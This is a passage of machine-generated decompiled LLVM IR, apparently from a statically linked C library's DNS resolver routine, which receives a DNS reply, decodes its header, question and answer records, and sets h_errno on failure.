  %v1_8056a5f = add i32 %v0_8056a5b, 232
  %v2_8056a5f = inttoptr i32 %v1_8056a5f to i16*
  store i16 1, i16* %v2_8056a5f, align 2
  %v0_8056a69 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056a69 = load i32, i32* @esp, align 4
  %v2_8056a69 = add i32 %v1_8056a69, 228
  %v3_8056a69 = inttoptr i32 %v2_8056a69 to i32*
  store i32 %v0_8056a69, i32* %v3_8056a69, align 4
  %v0_8056a70 = load i32, i32* @esp, align 4
  %v1_8056a73 = add i32 %v0_8056a70, 8
  %v2_8056a73 = inttoptr i32 %v1_8056a73 to i32*
  store i32 10000, i32* %v2_8056a73, align 4
  %v1_8056a78 = add i32 %v0_8056a70, 4
  %v2_8056a78 = inttoptr i32 %v1_8056a78 to i32*
  store i32 1, i32* %v2_8056a78, align 4
  %v1_8056a7a = add i32 %v0_8056a70, 228
  store i32 %v1_8056a7a, i32* %eax.global-to-local, align 4
  %v3_8056a81 = inttoptr i32 %v0_8056a70 to i32*
  store i32 %v1_8056a7a, i32* %v3_8056a81, align 4
  %v0_8056a82 = call i32 @__libc_poll()
  store i32 %v0_8056a82, i32* %eax.global-to-local, align 4
  %v0_8056a87 = load i32, i32* @esp, align 4
  %v1_8056a87 = add i32 %v0_8056a87, 16
  %tmp48 = icmp slt i32 %v0_8056a82, 1
  br i1 %tmp48, label %dec_label_pc_8056dab, label %dec_label_pc_8056a92

dec_label_pc_8056a92:                             ; preds = %dec_label_pc_8056a4b
  %v1_8056a92 = add i32 %v0_8056a87, 12
  %v2_8056a92 = inttoptr i32 %v1_8056a92 to i32*
  store i32 0, i32* %v2_8056a92, align 4
  %v1_8056a94 = add i32 %v0_8056a87, 8
  %v2_8056a94 = inttoptr i32 %v1_8056a94 to i32*
  store i32 512, i32* %v2_8056a94, align 4
  %v2_8056a99 = add i32 %v0_8056a87, 4
  %v3_8056a99 = inttoptr i32 %v2_8056a99 to i32*
  store i32 %v2_805675e, i32* %v3_8056a99, align 4
  %v1_8056a9a = add i32 %v0_8056a87, 36
  %v2_8056a9a = inttoptr i32 %v1_8056a9a to i32*
  %v3_8056a9a = load i32, i32* %v2_8056a9a, align 4
  %v6_8056a9a = inttoptr i32 %v0_8056a87 to i32*
  store i32 %v3_8056a9a, i32* %v6_8056a9a, align 4
  %v4_8056a9e = call i32 @__libc_recv(i32 -1, i32 %v15_80567ec, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8056a9e, i32* @eax, align 4
  %v1_8056aa3 = load i32, i32* @esp, align 4
  %v2_8056aa3 = add i32 %v1_8056aa3, 32
  %v3_8056aa3 = inttoptr i32 %v2_8056aa3 to i32*
  store i32 %v4_8056a9e, i32* %v3_8056aa3, align 4
  %v0_8056aa7 = load i32, i32* @esp, align 4
  %v1_8056aa7 = add i32 %v0_8056aa7, 16
  %v7_8056aad = icmp sgt i32 %v4_8056a9e, 11
  br i1 %v7_8056aad, label %dec_label_pc_8056ab3, label %dec_label_pc_8056d60

dec_label_pc_8056ab3:                             ; preds = %dec_label_pc_8056a92
  %v0_8056ab3 = load i32, i32* @ebx, align 4
  %v2_8056ab3 = add i32 %v0_8056aa7, 12
  %v3_8056ab3 = inttoptr i32 %v2_8056ab3 to i32*
  store i32 %v0_8056ab3, i32* %v3_8056ab3, align 4
  %v0_8056ab4 = load i32, i32* @ebx, align 4
  %v2_8056ab4 = add i32 %v0_8056aa7, 8
  %v3_8056ab4 = inttoptr i32 %v2_8056ab4 to i32*
  store i32 %v0_8056ab4, i32* %v3_8056ab4, align 4
  %v1_8056ab5 = add i32 %v0_8056aa7, 84
  store i32 %v1_8056ab5, i32* %eax.global-to-local, align 4
  %v2_8056ab9 = add i32 %v0_8056aa7, 4
  %v3_8056ab9 = inttoptr i32 %v2_8056ab9 to i32*
  store i32 %v1_8056ab5, i32* %v3_8056ab9, align 4
  %v3_8056aba = inttoptr i32 %v0_8056aa7 to i32*
  store i32 %v2_805675e, i32* %v3_8056aba, align 4
  %v0_8056abb = call i32 @__decode_header()
  store i32 %v0_8056abb, i32* %eax.global-to-local, align 4
  %v0_8056ac0 = load i32, i32* @esp, align 4
  %v1_8056ac0 = add i32 %v0_8056ac0, 84
  %v2_8056ac0 = inttoptr i32 %v1_8056ac0 to i32*
  %v3_8056ac0 = load i32, i32* %v2_8056ac0, align 4
  store i32 %v3_8056ac0, i32* %edx.global-to-local, align 4
  %v2_8056ac4 = add i32 %v0_8056ac0, 60
  %v3_8056ac4 = inttoptr i32 %v2_8056ac4 to i32*
  store i32 %v3_8056ac0, i32* %v3_8056ac4, align 4
  %v0_8056ac8 = load i32, i32* @esp, align 4
  %v1_8056ac8 = add i32 %v0_8056ac8, 16
  %v1_8056acb = add i32 %v0_8056ac8, 72
  %v2_8056acb = inttoptr i32 %v1_8056acb to i32*
  %v3_8056acb = load i32, i32* %v2_8056acb, align 4
  store i32 %v3_8056acb, i32* @eax, align 4
  %v0_8056acf = load i32, i32* %edx.global-to-local, align 4
  %v12_8056acf = icmp eq i32 %v0_8056acf, %v3_8056acb
  %v1_8056ad1 = icmp eq i1 %v12_8056acf, false
  br i1 %v1_8056ad1, label %dec_label_pc_8056d60, label %dec_label_pc_8056ad7

dec_label_pc_8056ad7:                             ; preds = %dec_label_pc_8056ab3
  %v1_8056ad7 = add i32 %v0_8056ac8, 88
  %v2_8056ad7 = inttoptr i32 %v1_8056ad7 to i32*
  %v3_8056ad7 = load i32, i32* %v2_8056ad7, align 4
  %v4_8056ad7 = icmp eq i32 %v3_8056ad7, 0
  br i1 %v4_8056ad7, label %dec_label_pc_8056d60, label %dec_label_pc_8056ae2

dec_label_pc_8056ae2:                             ; preds = %dec_label_pc_8056ad7
  %v1_8056ae2 = add i32 %v0_8056ac8, 112
  %v2_8056ae2 = inttoptr i32 %v1_8056ae2 to i32*
  %v3_8056ae2 = load i32, i32* %v2_8056ae2, align 4
  store i32 %v3_8056ae2, i32* @eax, align 4
  %v9_8056ae6 = icmp eq i32 %v3_8056ae2, 3
  %v1_8056ae9 = icmp eq i1 %v9_8056ae6, false
  br i1 %v1_8056ae9, label %dec_label_pc_8056b51, label %dec_label_pc_8056aeb

dec_label_pc_8056aeb:                             ; preds = %dec_label_pc_8056ae2
  %v1_8056aeb = add i32 %v0_8056ac8, 67
  %v2_8056aeb = inttoptr i32 %v1_8056aeb to i8*
  %v3_8056aeb = load i8, i8* %v2_8056aeb, align 1
  %v4_8056aeb = icmp eq i8 %v3_8056aeb, 0
  %v1_8056af0 = icmp eq i1 %v4_8056aeb, false
  br i1 %v1_8056af0, label %dec_label_pc_8056b41, label %dec_label_pc_8056af2

dec_label_pc_8056af2:                             ; preds = %dec_label_pc_8056aeb
  %v0_8056af2 = load i32, i32* @ecx, align 4
  %v2_8056af2 = add i32 %v0_8056ac8, 12
  %v3_8056af2 = inttoptr i32 %v2_8056af2 to i32*
  store i32 %v0_8056af2, i32* %v3_8056af2, align 4
  %v1_8056af3 = add i32 %v0_8056ac8, 8
  %v2_8056af3 = inttoptr i32 %v1_8056af3 to i32*
  store i32 ptrtoint (i32* @global_var_805f4a8.953 to i32), i32* %v2_8056af3, align 4
  %v1_8056af8 = add i32 %v0_8056ac8, 4
  %v2_8056af8 = inttoptr i32 %v1_8056af8 to i32*
  store i32 134567199, i32* %v2_8056af8, align 4
  %v1_8056afd = add i32 %v0_8056ac8, 200
  store i32 %v1_8056afd, i32* @esi, align 4
  %v3_8056b04 = inttoptr i32 %v0_8056ac8 to i32*
  store i32 %v1_8056afd, i32* %v3_8056b04, align 4
  %v2_8056b05 = call i32 @__pthread_return_void(i32 -1, i32 %v15_80567ec)
  store i32 %v2_8056b05, i32* %eax.global-to-local, align 4
  %v0_8056b0a = load i32, i32* @esp, align 4
  %v1_8056b0a = inttoptr i32 %v0_8056b0a to i32*
  store i32 ptrtoint (i32* @global_var_805f4a8.953 to i32), i32* %v1_8056b0a, align 4
  %v1_8056b11 = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_8056b11, i32* %eax.global-to-local, align 4
  %v0_8056b16 = load i32, i32* @global_var_8065b98.1018, align 8
  store i32 %v0_8056b16, i32* %ebx.global-to-local, align 4
  %v0_8056b1c = load i32, i32* @esp, align 4
  %v1_8056b1c = inttoptr i32 %v0_8056b1c to i32*
  %v2_8056b1c = load i32, i32* %v1_8056b1c, align 4
  store i32 %v2_8056b1c, i32* @eax, align 4
  %v3_8056b1c = add i32 %v0_8056b1c, 4
  %v1_8056b1d = inttoptr i32 %v3_8056b1c to i32*
  %v2_8056b1d = load i32, i32* %v1_8056b1d, align 4
  store i32 %v2_8056b1d, i32* %edx.global-to-local, align 4
  %v1_8056b1e = add i32 %v0_8056b16, -1
  store i32 %v1_8056b1e, i32* @ebx, align 4
  store i32 1, i32* %v1_8056b1d, align 4
  %v0_8056b21 = load i32, i32* @esi, align 4
  store i32 %v0_8056b21, i32* %v1_8056b1c, align 4
  %v2_8056b22 = call i32 @__pthread_return_void(i32 -1, i32 %v15_80567ec)
  store i32 %v2_8056b22, i32* %eax.global-to-local, align 4
  %v0_8056b27 = load i32, i32* @esp, align 4
  %v1_8056b2a = add i32 %v0_8056b27, 52
  %v2_8056b2a = inttoptr i32 %v1_8056b2a to i32*
  %v3_8056b2a = load i32, i32* %v2_8056b2a, align 4
  %v4_8056b2a = load i32, i32* @ebx, align 4
  %v5_8056b2a = sub i32 %v3_8056b2a, %v4_8056b2a
  %v11_8056b2a = xor i32 %v4_8056b2a, %v3_8056b2a
  %v12_8056b2a = xor i32 %v5_8056b2a, %v3_8056b2a
  %v13_8056b2a = and i32 %v12_8056b2a, %v11_8056b2a
  %v14_8056b2a = icmp slt i32 %v13_8056b2a, 0
  %v16_8056b2a = icmp slt i32 %v5_8056b2a, 0
  %v2_8056b2e = icmp eq i1 %v16_8056b2a, %v14_8056b2a
  br i1 %v2_8056b2e, label %dec_label_pc_8056b41, label %dec_label_pc_8056b30

dec_label_pc_8056b30:                             ; preds = %dec_label_pc_8056af2
  %v1_8056b30 = add i32 %v0_8056b27, 60
  %v2_8056b30 = inttoptr i32 %v1_8056b30 to i32*
  %v3_8056b30 = load i32, i32* %v2_8056b30, align 4
  store i32 %v3_8056b30, i32* %edx.global-to-local, align 4
  %v3_8056b34 = load i32, i32* %v2_8056b2a, align 4
  %v4_8056b34 = add i32 %v3_8056b34, 1
  store i32 %v4_8056b34, i32* %v2_8056b2a, align 4
  %v0_8056b38 = load i32, i32* %edx.global-to-local, align 4
  %v1_8056b38 = load i32, i32* @esp, align 4
  %v2_8056b38 = add i32 %v1_8056b38, 56
  %v3_8056b38 = inttoptr i32 %v2_8056b38 to i32*
  store i32 %v0_8056b38, i32* %v3_8056b38, align 4
  br label %dec_label_pc_8056dcc.backedge

dec_label_pc_8056b41:                             ; preds = %dec_label_pc_8056af2, %dec_label_pc_8056aeb
  %v0_8056b41 = call i32 @__GI___h_errno_location()
  store i32 %v0_8056b41, i32* %eax.global-to-local, align 4
  %v1_8056b46 = inttoptr i32 %v0_8056b41 to i32*
  store i32 1, i32* %v1_8056b46, align 4
  br label %dec_label_pc_8056e04

dec_label_pc_8056b51:                             ; preds = %dec_label_pc_8056ae2
  %v1_8056b51 = icmp eq i32 %v3_8056ae2, 0
  %v1_8056b53 = icmp eq i1 %v1_8056b51, false
  br i1 %v1_8056b53, label %dec_label_pc_8056d60, label %dec_label_pc_8056b59

dec_label_pc_8056b59:                             ; preds = %dec_label_pc_8056b51
  %v1_8056b59 = add i32 %v0_8056ac8, 120
  %v2_8056b59 = inttoptr i32 %v1_8056b59 to i32*
  %v3_8056b59 = load i32, i32* %v2_8056b59, align 4
  %tmp49 = icmp slt i32 %v3_8056b59, 1
  br i1 %tmp49, label %dec_label_pc_8056b69, label %dec_label_pc_8056b60

dec_label_pc_8056b60:                             ; preds = %dec_label_pc_8056b59
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8056b88

dec_label_pc_8056b69:                             ; preds = %dec_label_pc_8056b59
  %v0_8056b69 = call i32 @__GI___h_errno_location()
  store i32 %v0_8056b69, i32* %eax.global-to-local, align 4
  %v1_8056b6e = inttoptr i32 %v0_8056b69 to i32*
  store i32 4, i32* %v1_8056b6e, align 4
  br label %dec_label_pc_8056e04

dec_label_pc_8056b79:                             ; preds = %dec_label_pc_8056b88
  %v2_8056b79 = add i32 %v0_8056b90, -4
  %v3_8056b79 = inttoptr i32 %v2_8056b79 to i32*
  store i32 %v0_8056b79, i32* %v3_8056b79, align 4
  %v0_8056b7a = load i32, i32* @ebx, align 4
  %v1_8056b7a = add i32 %v0_8056b7a, 1
  store i32 %v1_8056b7a, i32* @ebx, align 4
  %v0_8056b7b = load i32, i32* @eax, align 4
  %v2_8056b7b = add i32 %v0_8056b90, -8
  %v3_8056b7b = inttoptr i32 %v2_8056b7b to i32*
  store i32 %v0_8056b7b, i32* %v3_8056b7b, align 4
  %v0_8056b7c = load i32, i32* @esi, align 4
  %v2_8056b7c = add i32 %v0_8056b90, -12
  %v3_8056b7c = inttoptr i32 %v2_8056b7c to i32*
  store i32 %v0_8056b7c, i32* %v3_8056b7c, align 4
  %v2_8056b7d = add i32 %v0_8056b90, -16
  %v3_8056b7d = inttoptr i32 %v2_8056b7d to i32*
  store i32 %v2_805675e, i32* %v3_8056b7d, align 4
  %v0_8056b7e = call i32 @__length_question()
  store i32 %v0_8056b7e, i32* @eax, align 4
  %v0_8056b83 = load i32, i32* @esp, align 4
  %v1_8056b83 = add i32 %v0_8056b83, 16
  %v0_8056b86 = load i32, i32* @esi, align 4
  %v2_8056b86 = add i32 %v0_8056b86, %v0_8056b7e
  %v0_8056b88.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8056b88

dec_label_pc_8056b88:                             ; preds = %dec_label_pc_8056b60, %dec_label_pc_8056b79
  %v0_8056b79 = phi i32 [ %v3_8056ae2, %dec_label_pc_8056b60 ], [ %v0_8056b7e, %dec_label_pc_8056b79 ]
  %v0_8056b90 = phi i32 [ %v1_8056ac8, %dec_label_pc_8056b60 ], [ %v1_8056b83, %dec_label_pc_8056b79 ]
  %v0_8056b88 = phi i32 [ 0, %dec_label_pc_8056b60 ], [ %v0_8056b88.pre, %dec_label_pc_8056b79 ]
  %storemerge = phi i32 [ 12, %dec_label_pc_8056b60 ], [ %v2_8056b86, %dec_label_pc_8056b79 ]
  store i32 %storemerge, i32* @esi, align 4
  %v2_8056b88 = add i32 %v0_8056b90, 100
  %v3_8056b88 = inttoptr i32 %v2_8056b88 to i32*
  %v4_8056b88 = load i32, i32* %v3_8056b88, align 4
  %v5_8056b88 = sub i32 %v0_8056b88, %v4_8056b88
  %v11_8056b88 = xor i32 %v4_8056b88, %v0_8056b88
  %v12_8056b88 = xor i32 %v5_8056b88, %v0_8056b88
  %v13_8056b88 = and i32 %v12_8056b88, %v11_8056b88
  %v14_8056b88 = icmp slt i32 %v13_8056b88, 0
  %v16_8056b88 = icmp slt i32 %v5_8056b88, 0
  %v2_8056b8c = icmp eq i1 %v16_8056b88, %v14_8056b88
  br i1 %v2_8056b8c, label %dec_label_pc_8056b8e, label %dec_label_pc_8056b79

dec_label_pc_8056b8e:                             ; preds = %dec_label_pc_8056b88
  store i32 0, i32* @ebx, align 4
  %v1_8056b90 = add i32 %v0_8056b90, 27
  %v2_8056b90 = inttoptr i32 %v1_8056b90 to i8*
  store i8 1, i8* %v2_8056b90, align 1
  %v0_8056cbe.pre = load i32, i32* @ebx, align 4
  %v1_8056cbe.pre = load i32, i32* @esp, align 4
  %v2_8056cbe55 = add i32 %v1_8056cbe.pre, 104
  %v3_8056cbe56 = inttoptr i32 %v2_8056cbe55 to i32*
  %v4_8056cbe57 = load i32, i32* %v3_8056cbe56, align 4
  %v5_8056cbe58 = sub i32 %v0_8056cbe.pre, %v4_8056cbe57
  %v11_8056cbe60 = xor i32 %v4_8056cbe57, %v0_8056cbe.pre
  %v12_8056cbe61 = xor i32 %v5_8056cbe58, %v0_8056cbe.pre
  %v13_8056cbe62 = and i32 %v12_8056cbe61, %v11_8056cbe60
  %v14_8056cbe63 = icmp slt i32 %v13_8056cbe62, 0
  %v16_8056cbe65 = icmp slt i32 %v5_8056cbe58, 0
  %v2_8056cc266 = icmp eq i1 %v16_8056cbe65, %v14_8056cbe63
  br i1 %v2_8056cc266, label %dec_label_pc_8056cce, label %dec_label_pc_8056cc4.lr.ph

dec_label_pc_8056cc4.lr.ph:                       ; preds = %dec_label_pc_8056b8e
  %v0_8056cc4.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8056cc4

dec_label_pc_8056b9a:                             ; preds = %dec_label_pc_8056cc4
  %v1_8056b9a = add i32 %v0_8056b9a67, 116
  store i32 %v1_8056b9a, i32* %eax.global-to-local, align 4
  %v2_8056b9e = add i32 %v0_8056b9a67, -4
  %v3_8056b9e = inttoptr i32 %v2_8056b9e to i32*
  store i32 %v1_8056b9a, i32* %v3_8056b9e, align 4
  %v3_8056b9f = load i32, i32* %v3_8056cc4, align 4
  %v5_8056b9f = add i32 %v0_8056b9a67, -8
  %v6_8056b9f = inttoptr i32 %v5_8056b9f to i32*
  store i32 %v3_8056b9f, i32* %v6_8056b9f, align 4
  %v0_8056ba3 = load i32, i32* @esi, align 4
  %v2_8056ba3 = add i32 %v0_8056b9a67, -12
  %v3_8056ba3 = inttoptr i32 %v2_8056ba3 to i32*
  store i32 %v0_8056ba3, i32* %v3_8056ba3, align 4
  %v2_8056ba4 = add i32 %v0_8056b9a67, -16
  %v3_8056ba4 = inttoptr i32 %v2_8056ba4 to i32*
  store i32 %v2_805675e, i32* %v3_8056ba4, align 4
  %v0_8056ba5 = call i32 @__decode_answer()
  store i32 %v0_8056ba5, i32* @eax, align 4
  %v1_8056baa = load i32, i32* @esp, align 4
  %v2_8056baa = add i32 %v1_8056baa, 68
  %v3_8056baa = inttoptr i32 %v2_8056baa to i32*
  store i32 %v0_8056ba5, i32* %v3_8056baa, align 4
  %v0_8056bae = load i32, i32* @esp, align 4
  %v1_8056bae = add i32 %v0_8056bae, 16
  %v2_8056bb1 = icmp slt i32 %v0_8056ba5, 0
  %v1_8056bb3 = icmp eq i1 %v2_8056bb1, false
  br i1 %v1_8056bb3, label %dec_label_pc_8056bcd, label %dec_label_pc_8056bb5

dec_label_pc_8056bb5:                             ; preds = %dec_label_pc_8056b9a
  %v0_8056bb5 = load i32, i32* @ebx, align 4
  %v1_8056bb5 = icmp eq i32 %v0_8056bb5, 0
  br i1 %v1_8056bb5, label %dec_label_pc_8056d60, label %dec_label_pc_8056bbd

dec_label_pc_8056bbd:                             ; preds = %dec_label_pc_8056bb5
  %v1_8056bbd = add i32 %v0_8056bae, 100
  %v2_8056bbd = inttoptr i32 %v1_8056bbd to i32*
  %v3_8056bbd = load i32, i32* %v2_8056bbd, align 4
  %v4_8056bbd = icmp eq i32 %v3_8056bbd, 0
  br i1 %v4_8056bbd, label %dec_label_pc_8056d60, label %dec_label_pc_8056cce

dec_label_pc_8056bcd:                             ; preds = %dec_label_pc_8056b9a
  %v1_8056bcd = add i32 %v0_8056bae, 43
  %v2_8056bcd = inttoptr i32 %v1_8056bcd to i8*
  %v3_8056bcd = load i8, i8* %v2_8056bcd, align 1
  %v4_8056bcd = icmp eq i8 %v3_8056bcd, 0
  br i1 %v4_8056bcd, label %dec_label_pc_8056c6e, label %dec_label_pc_8056bd8

dec_label_pc_8056bd8:                             ; preds = %dec_label_pc_8056bcd
  %v0_8056bd8 = load i32, i32* @edi, align 4
  %v1_8056bd8 = add i32 %v0_8056bd8, 28
  %v2_8056bd8 = inttoptr i32 %v1_8056bd8 to i32*
  %v3_8056bd8 = load i32, i32* %v2_8056bd8, align 4
  store i32 %v3_8056bd8, i32* %eax.global-to-local, align 4
  %v2_8056bdb = add i32 %v0_8056bae, 160
  %v3_8056bdb = inttoptr i32 %v2_8056bdb to i32*
  store i32 %v3_8056bd8, i32* %v3_8056bdb, align 4
  %v0_8056be2 = load i32, i32* @edi, align 4
  %v1_8056be2 = add i32 %v0_8056be2, 32
  %v2_8056be2 = inttoptr i32 %v1_8056be2 to i32*
  %v3_8056be2 = load i32, i32* %v2_8056be2, align 4
  store i32 %v3_8056be2, i32* %eax.global-to-local, align 4
  %v1_8056be5 = load i32, i32* @esp, align 4
  %v2_8056be5 = add i32 %v1_8056be5, 148
  %v3_8056be5 = inttoptr i32 %v2_8056be5 to i32*
  store i32 %v3_8056be2, i32* %v3_8056be5, align 4
  %v0_8056bec = load i32, i32* @edi, align 4
  %v1_8056bec = add i32 %v0_8056bec, 36
  %v2_8056bec = inttoptr i32 %v1_8056bec to i32*
  %v3_8056bec = load i32, i32* %v2_8056bec, align 4
  store i32 %v3_8056bec, i32* %eax.global-to-local, align 4
  %v1_8056bef = load i32, i32* @esp, align 4
  %v2_8056bef = add i32 %v1_8056bef, 152
  %v3_8056bef = inttoptr i32 %v2_8056bef to i32*
  store i32 %v3_8056bec, i32* %v3_8056bef, align 4
  %v0_8056bf6 = load i32, i32* @ecx, align 4
  %v1_8056bf6 = load i32, i32* @esp, align 4
  %v2_8056bf6 = add i32 %v1_8056bf6, -4
  %v3_8056bf6 = inttoptr i32 %v2_8056bf6 to i32*
  store i32 %v0_8056bf6, i32* %v3_8056bf6, align 4
  %v1_8056bf7 = add i32 %v1_8056bf6, -8
  %v2_8056bf7 = inttoptr i32 %v1_8056bf7 to i32*
  store i32 40, i32* %v2_8056bf7, align 4
  %v1_8056bf9 = add i32 %v1_8056bf6, 116
  store i32 %v1_8056bf9, i32* %edx.global-to-local, align 4
  %v2_8056bfd = add i32 %v1_8056bf6, -12
  %v3_8056bfd = inttoptr i32 %v2_8056bfd to i32*
  store i32 %v1_8056bf9, i32* %v3_8056bfd, align 4
  %v0_8056bfe = load i32, i32* @edi, align 4
  %v2_8056bfe = add i32 %v1_8056bf6, -16
  %v3_8056bfe = inttoptr i32 %v2_8056bfe to i32*
  store i32 %v0_8056bfe, i32* %v3_8056bfe, align 4
  %v4_8056bff = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_80567ec, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8056bff, i32* %eax.global-to-local, align 4
  %v0_8056c04 = load i32, i32* @edi, align 4
  %v1_8056c04 = add i32 %v0_8056c04, 4
  %v2_8056c04 = inttoptr i32 %v1_8056c04 to i32*
  %v3_8056c04 = load i32, i32* %v2_8056c04, align 4
  store i32 %v3_8056c04, i32* %eax.global-to-local, align 4
  %v0_8056c07 = load i32, i32* @esp, align 4
  %v1_8056c07 = add i32 %v0_8056c07, 16
  %v9_8056c0a = icmp eq i32 %v3_8056c04, 24
  br i1 %v9_8056c0a, label %dec_label_pc_8056bd8.dec_label_pc_8056c31_crit_edge, label %dec_label_pc_8056c0f

dec_label_pc_8056bd8.dec_label_pc_8056c31_crit_edge: ; preds = %dec_label_pc_8056bd8
  %.pre24 = add i32 %v0_8056c07, 260
  %.pre25 = inttoptr i32 %.pre24 to i32*
  %v4_8056c31.pre = load i32, i32* %.pre25, align 4
  br label %dec_label_pc_8056c31

dec_label_pc_8056c0f:                             ; preds = %dec_label_pc_8056bd8
  %v1_8056c0f = add i32 %v0_8056c04, 28
  %v2_8056c0f = inttoptr i32 %v1_8056c0f to i32*
  %v3_8056c0f = load i32, i32* %v2_8056c0f, align 4
  %v4_8056c0f = icmp eq i32 %v3_8056c0f, 0
  br i1 %v4_8056c0f, label %dec_label_pc_8056cce, label %dec_label_pc_8056c19

dec_label_pc_8056c19:                             ; preds = %dec_label_pc_8056c0f
  %v1_8056c19 = add i32 %v0_8056c07, 260
  %v2_8056c19 = inttoptr i32 %v1_8056c19 to i32*
  %v3_8056c19 = load i32, i32* %v2_8056c19, align 4
  %v12_8056c19 = icmp eq i32 %v3_8056c19, 1
  br i1 %v12_8056c19, label %dec_label_pc_8056c31, label %dec_label_pc_8056c23

dec_label_pc_8056c23:                             ; preds = %dec_label_pc_8056c19
  %v12_8056c23 = icmp eq i32 %v3_8056c19, 28
  %v1_8056c2b = icmp eq i1 %v12_8056c23, false
  br i1 %v1_8056c2b, label %dec_label_pc_8056cce, label %dec_label_pc_8056c31

dec_label_pc_8056c31:                             ; preds = %dec_label_pc_8056bd8.dec_label_pc_8056c31_crit_edge, %dec_label_pc_8056c23, %dec_label_pc_8056c19
  %v4_8056c31 = phi i32 [ %v4_8056c31.pre, %dec_label_pc_8056bd8.dec_label_pc_8056c31_crit_edge ], [ %v3_8056c19, %dec_label_pc_8056c23 ], [ %v3_8056c19, %dec_label_pc_8056c19 ]
  %v15_8056c31 = icmp eq i32 %v3_8056c04, %v4_8056c31
  br i1 %v15_8056c31, label %dec_label_pc_8056c46, label %dec_label_pc_8056c3a

dec_label_pc_8056c3a:                             ; preds = %dec_label_pc_8056c31
  %v1_8056c3d = inttoptr i32 %v0_8056c04 to i32*
  %v2_8056c3d = load i32, i32* %v1_8056c3d, align 4
  %v5_8056c3d = inttoptr i32 %v0_8056c07 to i32*
  store i32 %v2_8056c3d, i32* %v5_8056c3d, align 4
  %v1_8056c3f = call i32 @free(i32 -1)
  store i32 %v1_8056c3f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056cb6

dec_label_pc_8056c46:                             ; preds = %dec_label_pc_8056c31
  %v0_8056c46 = load i32, i32* @ebx, align 4
  %v1_8056c48 = sub i32 -1, %v0_8056c46
  store i32 %v1_8056c48, i32* %eax.global-to-local, align 4
  %v2_8056c4a = add i32 %v0_8056c07, 120
  %v3_8056c4a = inttoptr i32 %v2_8056c4a to i32*
  %v4_8056c4a = load i32, i32* %v3_8056c4a, align 4
  %v5_8056c4a = add i32 %v4_8056c4a, %v1_8056c48
  store i32 %v5_8056c4a, i32* %eax.global-to-local, align 4
  %v2_8056c4e = add i32 %v0_8056c04, 36
  %v3_8056c4e = inttoptr i32 %v2_8056c4e to i32*
  store i32 %v5_8056c4a, i32* %v3_8056c4e, align 4
  %v0_8056c51 = load i32, i32* @edi, align 4
  %v1_8056c51 = add i32 %v0_8056c51, 16
  %v2_8056c51 = inttoptr i32 %v1_8056c51 to i32*
  %v3_8056c51 = load i32, i32* %v2_8056c51, align 4
  %v1_8056c54 = add i32 %v3_8056c51, 4
  store i32 %v1_8056c54, i32* %eax.global-to-local, align 4
  %v2_8056c57 = add i32 %v0_8056c51, 36
  %v3_8056c57 = inttoptr i32 %v2_8056c57 to i32*
  %v4_8056c57 = load i32, i32* %v3_8056c57, align 4
  %v7_8056c57 = mul i32 %v4_8056c57, %v1_8056c54
  store i32 %v7_8056c57, i32* %eax.global-to-local, align 4
  %v2_8056c5b = add i32 %v0_8056c51, 32
  %v3_8056c5b = inttoptr i32 %v2_8056c5b to i32*
  %v4_8056c5b = load i32, i32* %v3_8056c5b, align 4
  %v6_8056c5e = icmp ugt i32 %v7_8056c57, %v4_8056c5b
  br i1 %v6_8056c5e, label %dec_label_pc_8056c46.dec_label_pc_8056cce.loopexit_crit_edge, label %dec_label_pc_8056c60

dec_label_pc_8056c46.dec_label_pc_8056cce.loopexit_crit_edge: ; preds = %dec_label_pc_8056c46
  %v0_8056cce.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8056cce

dec_label_pc_8056c60:                             ; preds = %dec_label_pc_8056c46
  store i32 0, i32* %v3_8056c57, align 4
  %v0_8056c67 = load i32, i32* @esp, align 4
  %v1_8056c67 = add i32 %v0_8056c67, 27
  %v2_8056c67 = inttoptr i32 %v1_8056c67 to i8*
  store i8 0, i8* %v2_8056c67, align 1
  %v1_8056cb9.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8056cb9

dec_label_pc_8056c6e:                             ; preds = %dec_label_pc_8056bcd
  %v1_8056c71 = add i32 %v0_8056bae, 132
  %v2_8056c71 = inttoptr i32 %v1_8056c71 to i32*
  %v3_8056c71 = load i32, i32* %v2_8056c71, align 4
  %v6_8056c71 = inttoptr i32 %v0_8056bae to i32*
  store i32 %v3_8056c71, i32* %v6_8056c71, align 4
  %v1_8056c78 = call i32 @free(i32 -1)
  store i32 %v1_8056c78, i32* %eax.global-to-local, align 4
  %v0_8056c7d = load i32, i32* @esp, align 4
  %v1_8056c7d = add i32 %v0_8056c7d, 16
  %v1_8056c80 = add i32 %v0_8056c7d, 260
  %v2_8056c80 = inttoptr i32 %v1_8056c80 to i32*
  %v3_8056c80 = load i32, i32* %v2_8056c80, align 4
  store i32 %v3_8056c80, i32* %eax.global-to-local, align 4
  %v1_8056c87 = add i32 %v0_8056c7d, 136
  %v2_8056c87 = inttoptr i32 %v1_8056c87 to i32*
  %v3_8056c87 = load i32, i32* %v2_8056c87, align 4
  %v15_8056c87 = icmp eq i32 %v3_8056c87, %v3_8056c80
  %v1_8056c8b = icmp eq i1 %v15_8056c87, false
  br i1 %v1_8056c8b, label %dec_label_pc_8056cb9, label %dec_label_pc_8056c8d

dec_label_pc_8056c8d:                             ; preds = %dec_label_pc_8056c6e
  %v0_8056c8d = load i32, i32* @edi, align 4
  %v1_8056c8d = add i32 %v0_8056c8d, 16
  %v2_8056c8d = inttoptr i32 %v1_8056c8d to i32*
  %v3_8056c8d = load i32, i32* %v2_8056c8d, align 4
  store i32 %v3_8056c8d, i32* %eax.global-to-local, align 4
  %v2_8056c90 = add i32 %v0_8056c7d, 148
  %v3_8056c90 = inttoptr i32 %v2_8056c90 to i32*
  %v4_8056c90 = load i32, i32* %v3_8056c90, align 4
  %v15_8056c90 = icmp eq i32 %v3_8056c8d, %v4_8056c90
  %v1_8056c97 = icmp eq i1 %v15_8056c90, false
  br i1 %v1_8056c97, label %dec_label_pc_8056d53, label %dec_label_pc_8056c9d

